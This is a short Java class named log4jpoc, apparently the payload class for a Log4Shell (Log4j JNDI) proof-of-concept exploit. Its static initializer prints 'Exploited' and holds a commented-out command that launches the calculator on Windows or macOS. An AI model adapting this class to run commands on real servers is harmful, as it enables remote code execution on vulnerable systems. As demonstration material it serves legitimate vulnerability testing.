public class log4jpoc {
    public log4jpoc() {}
    static {
        try {
            /*String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();*/
            System.out.println("Exploited");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        log4jpoc e = new log4jpoc();
    }
}